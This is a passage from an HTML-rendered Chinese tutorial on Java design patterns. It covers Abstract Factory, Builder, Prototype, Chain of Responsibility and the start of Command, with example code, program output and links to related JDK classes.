keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ProductB1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteFactory2</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractFactory</span> <span class="token punctuation">{</span>    AbstractProductA <span class="token function">createProductA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ProductA2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    AbstractProductB <span class="token function">createProductB</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ProductB2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        AbstractFactory abstractFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteFactory1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        AbstractProductA productA <span class="token operator">=</span> abstractFactory<span class="token punctuation">.</span><span class="token function">createProductA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        AbstractProductB productB <span class="token operator">=</span> abstractFactory<span class="token punctuation">.</span><span class="token function">createProductB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// do something with productA and productB</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="JDK-2"><a href="#JDK-2" class="headerlink" title="JDK"></a>JDK</h3><ul><li><a href="http://docs.oracle.com/javase/8/docs/api/javax/xml/parsers/DocumentBuilderFactory.html" target="_blank" rel="noopener">javax.xml.parsers.DocumentBuilderFactory</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/javax/xml/transform/TransformerFactory.html#newInstance--" target="_blank" rel="noopener">javax.xml.transform.TransformerFactory</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/javax/xml/xpath/XPathFactory.html#newInstance--" target="_blank" rel="noopener">javax.xml.xpath.XPathFactory</a></li></ul><h2 id="5-生成器（Builder）"><a href="#5-生成器（Builder）" class="headerlink" title="5. 生成器（Builder）"></a>5. 生成器（Builder）</h2><h3 id="Intent-4"><a href="#Intent-4" class="headerlink" title="Intent"></a>Intent</h3><p>封装一个对象的构造过程，并允许按步骤构造。</p><h3 id="Class-Diagram-4"><a href="#Class-Diagram-4" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/13b0940e-d1d7-4b17-af4f-b70cb0a75e08.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/13b0940e-d1d7-4b17-af4f-b70cb0a75e08.png" alt="img"></a></p><h3 id="Implementation-4"><a href="#Implementation-4" class="headerlink" title="Implementation"></a>Implementation</h3><p>以下是一个简易的 StringBuilder 实现，参考了 JDK 1.8 源码。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AbstractStringBuilder</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> value<span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token keyword">int</span> count<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">AbstractStringBuilder</span><span class="token punctuation">(</span><span class="token keyword">int</span> capacity<span class="token punctuation">)</span> <span class="token punctuation">{</span>        count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        value <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">char</span><span class="token punctuation">[</span>capacity<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> AbstractStringBuilder <span class="token function">append</span><span class="token punctuation">(</span><span class="token keyword">char</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">ensureCapacityInternal</span><span class="token punctuation">(</span>count <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        value<span class="token punctuation">[</span>count<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> c<span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">ensureCapacityInternal</span><span class="token punctuation">(</span><span class="token keyword">int</span> minimumCapacity<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// overflow-conscious code</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>minimumCapacity <span class="token operator">-</span> value<span class="token punctuation">.</span>length <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">expandCapacity</span><span class="token punctuation">(</span>minimumCapacity<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">void</span> <span class="token function">expandCapacity</span><span class="token punctuation">(</span><span class="token keyword">int</span> minimumCapacity<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> newCapacity <span class="token operator">=</span> value<span class="token punctuation">.</span>length <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>newCapacity <span class="token operator">-</span> minimumCapacity <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>            newCapacity <span class="token operator">=</span> minimumCapacity<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>newCapacity <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>minimumCapacity <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// overflow</span>                <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">OutOfMemoryError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            newCapacity <span class="token operator">=</span> Integer<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        value <span class="token operator">=</span> Arrays<span class="token punctuation">.</span><span class="token function">copyOf</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> newCapacity<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StringBuilder</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractStringBuilder</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Create a copy, don't share the array</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>value<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> count<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        StringBuilder sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">final</span> <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">26</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> count<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            sb<span class="token punctuation">.</span><span class="token function">append</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">+</span> i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>sb<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>abcdefghijklmnopqrstuvwxyz</code></pre><h3 id="JDK-3"><a href="#JDK-3" class="headerlink" title="JDK"></a>JDK</h3><ul><li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/StringBuilder.html" target="_blank" rel="noopener">java.lang.StringBuilder</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/nio/ByteBuffer.html#put-byte-" target="_blank" rel="noopener">java.nio.ByteBuffer</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/StringBuffer.html#append-boolean-" target="_blank" rel="noopener">java.lang.StringBuffer</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/Appendable.html" target="_blank" rel="noopener">java.lang.Appendable</a></li><li><a href="https://github.com/apache/camel/tree/0e195428ee04531be27a0b659005e3aa8d159d23/camel-core/src/main/java/org/apache/camel/builder">Apache Camel builders</a></li></ul><h2 id="6-原型模式（Prototype）"><a href="#6-原型模式（Prototype）" class="headerlink" title="6. 原型模式（Prototype）"></a>6. 原型模式（Prototype）</h2><h3 id="Intent-5"><a href="#Intent-5" class="headerlink" title="Intent"></a>Intent</h3><p>使用原型实例指定要创建对象的类型，通过复制这个原型来创建新对象。</p><h3 id="Class-Diagram-5"><a href="#Class-Diagram-5" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/a40661e4-1a71-46d2-a158-ff36f7fc3331.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/a40661e4-1a71-46d2-a158-ff36f7fc3331.png" alt="img"></a></p><h3 id="Implementation-5"><a href="#Implementation-5" class="headerlink" title="Implementation"></a>Implementation</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Prototype</span> <span class="token punctuation">{</span>    <span class="token keyword">abstract</span> Prototype <span class="token function">myClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcretePrototype</span> <span class="token keyword">extends</span> <span class="token class-name">Prototype</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> String filed<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">ConcretePrototype</span><span class="token punctuation">(</span>String filed<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>filed <span class="token operator">=</span> filed<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    Prototype <span class="token function">myClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ConcretePrototype</span><span class="token punctuation">(</span>filed<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> String <span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> filed<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Prototype prototype <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcretePrototype</span><span class="token punctuation">(</span><span class="token string">"abc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Prototype clone <span class="token operator">=</span> prototype<span class="token punctuation">.</span><span class="token function">myClone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>clone<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>abc</code></pre><h3 id="JDK-4"><a href="#JDK-4" class="headerlink" title="JDK"></a>JDK</h3><ul><li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/Object.html#clone%28%29" target="_blank" rel="noopener">java.lang.Object#clone()</a></li></ul><h1 id="三、行为型"><a href="#三、行为型" class="headerlink" title="三、行为型"></a>三、行为型</h1><h2 id="1-责任链（Chain-Of-Responsibility）"><a href="#1-责任链（Chain-Of-Responsibility）" class="headerlink" title="1. 责任链（Chain Of Responsibility）"></a>1. 责任链（Chain Of Responsibility）</h2><h3 id="Intent-6"><a href="#Intent-6" class="headerlink" title="Intent"></a>Intent</h3><p>使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系。将这些对象连成一条链，并沿着这条链发送该请求，直到有一个对象处理它为止。</p><h3 id="Class-Diagram-6"><a href="#Class-Diagram-6" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><ul><li>Handler：定义处理请求的接口，并且实现后继链（successor）</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/691f11eb-31a7-46be-9de1-61f433c4b3c7.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/691f11eb-31a7-46be-9de1-61f433c4b3c7.png" alt="img"></a></p><h3 id="Implementation-6"><a href="#Implementation-6" class="headerlink" title="Implementation"></a>Implementation</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Handler</span> <span class="token punctuation">{</span>    <span class="token keyword">protected</span> Handler successor<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Handler</span><span class="token punctuation">(</span>Handler successor<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>successor <span class="token operator">=</span> successor<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">protected</span> <span class="token keyword">abstract</span> <span class="token keyword">void</span> <span class="token function">handleRequest</span><span class="token punctuation">(</span>Request request<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteHandler1</span> <span class="token keyword">extends</span> <span class="token class-name">Handler</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">ConcreteHandler1</span><span class="token punctuation">(</span>Handler successor<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>successor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">handleRequest</span><span class="token punctuation">(</span>Request request<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> RequestType<span class="token punctuation">.</span>TYPE1<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" is handle by ConcreteHandler1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>successor <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            successor<span class="token punctuation">.</span><span class="token function">handleRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteHandler2</span> <span class="token keyword">extends</span> <span class="token class-name">Handler</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token function">ConcreteHandler2</span><span class="token punctuation">(</span>Handler successor<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>successor<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">handleRequest</span><span class="token punctuation">(</span>Request request<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> RequestType<span class="token punctuation">.</span>TYPE2<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" is handle by ConcreteHandler2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>successor <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            successor<span class="token punctuation">.</span><span class="token function">handleRequest</span><span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Request</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> RequestType type<span class="token punctuation">;</span>    <span class="token keyword">private</span> String name<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Request</span><span class="token punctuation">(</span>RequestType type<span class="token punctuation">,</span> String name<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>type <span class="token operator">=</span> type<span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> RequestType <span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> type<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> String <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> name<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">enum</span> RequestType <span class="token punctuation">{</span>    TYPE1<span class="token punctuation">,</span> TYPE2<span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Handler handler1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteHandler1</span><span class="token punctuation">(</span>null<span class="token punctuation">)</span><span class="token punctuation">;</span>        Handler handler2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteHandler2</span><span class="token punctuation">(</span>handler1<span class="token punctuation">)</span><span class="token punctuation">;</span>        Request request1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span>RequestType<span class="token punctuation">.</span>TYPE1<span class="token punctuation">,</span> <span class="token string">"request1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        handler2<span class="token punctuation">.</span><span class="token function">handleRequest</span><span class="token punctuation">(</span>request1<span class="token punctuation">)</span><span class="token punctuation">;</span>        Request request2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span>RequestType<span class="token punctuation">.</span>TYPE2<span class="token punctuation">,</span> <span class="token string">"request2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        handler2<span class="token punctuation">.</span><span class="token function">handleRequest</span><span class="token punctuation">(</span>request2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>request1 is handle by ConcreteHandler1request2 is handle by ConcreteHandler2</code></pre><h3 id="JDK-5"><a href="#JDK-5" class="headerlink" title="JDK"></a>JDK</h3><ul><li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/logging/Logger.html#log%28java.util.logging.Level,%20java.lang.String%29" target="_blank" rel="noopener">java.util.logging.Logger#log()</a></li><li><a href="https://commons.apache.org/proper/commons-chain/index.html" target="_blank" rel="noopener">Apache Commons Chain</a></li><li><a href="http://docs.oracle.com/javaee/7/api/javax/servlet/Filter.html#doFilter-javax.servlet.ServletRequest-javax.servlet.ServletResponse-javax.servlet.FilterChain-" target="_blank" rel="noopener">javax.servlet.Filter#doFilter()</a></li></ul><h2 id="2-命令（Command）"><a href="#2-命令（Command）" class="headerlink" title="2. 命令（Command）"></a>2. 命令（Command）</h2><h3 id="Intent-7"><a href="#Intent-7" class="headerlink" title="Intent"></a>Intent</h3><p>将命令封装成对象中，具有以下作用：</p><ul><li>使用命令来参数化其它对象</li><li>将命令放入队列中进行排队</li><li>将命令的操作记录到日志中</li><li>支持可撤销的操作</li></ul><h3 id="Class-Diagram-7"><a href="#Class-Diagram-7" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><ul><li>Command：命令</li><li>Receiver：命令接收者，也就是命令真正的执行者</li><li>Invoker：通过它来调用命令</li><li>Client：可以设置命令与命令的接收者</li></ul><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/ae1b27b8-bc13-42e7-ac12-a2242e125499.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/ae1b27b8-bc13-42e7-ac12-a2242e125499.png" alt="img"></a></p><h3 id="Implementation-7"><a href="#Implementation-7" class="headerlink" title="Implementation"></a>Implementation</h3><p>设计一个遥控器，可以控制电灯开关。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/e6bded8e-41a0-489a-88a6-638e88ab7666.jpg"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/e6bded8e-41a0-489a-88a6-638e88ab7666.jpg" alt="img"></a></p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Command</span> <span class="token punctuation">{</span>    <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LightOnCommand</span> <span class="token keyword">implements</span> <span class="token class-name">Command</span> <span class="token punctuation">{</span>    Light light<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">LightOnCommand</span><span class="token punctuation">(</span>Light light<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>light <span class="token operator">=</span> light<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        light<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">LightOffCommand</span> <span class="token keyword">implements</span> <span class="token class-name">Command</span> <span class="token punctuation">{</span>    Light light<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">LightOffCommand</span><span class="token punctuation">(</span>Light light<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>light <span class="token operator">=</span> light<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        light<span class="token punctuation">.</span><span class="token function">off</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Light</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">on</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Light is on!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">off</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Light is off!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/** * 遥控器 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Invoker</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> Command<span class="token punctuation">[</span><span class="token punctuation">]</span> onCommands<span class="token punctuation">;</span>    <span class="token keyword">private</span> Command<span class="token punctuation">[</span><span class="token punctuation">]</span> offCommands<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> slotNum <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token function">Invoker</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>onCommands <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Command</span><span class="token punctuation">[</span>slotNum<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>offCommands <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Command</span><span class="token punctuation">[</span>slotNum<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOnCommand</span><span class="token punctuation">(</span>Command command<span class="token punctuation">,</span> <span class="token keyword">int</span> slot<span class="token punctuation">)</span> <span class="token punctuation">{</span>        onCommands<span class="token punctuation">[</span>slot<span class="token punctuation">]</span> <span class="token operator">=</span> command<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setOffCommand</span><span class="token punctuation">(</span>Command command<span class="token punctuation">,</span> <span class="token keyword">int</span> slot<span class="token punctuation">)</span> <span class="token punctuation">{</span>        offCommands<span class="token punctuation">[</span>slot<span class="token punctuation">]</span> <span class="token operator">=</span> command<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">onButtonWasPushed</span><span class="token punctuation">(</span><span class="token keyword">int</span> 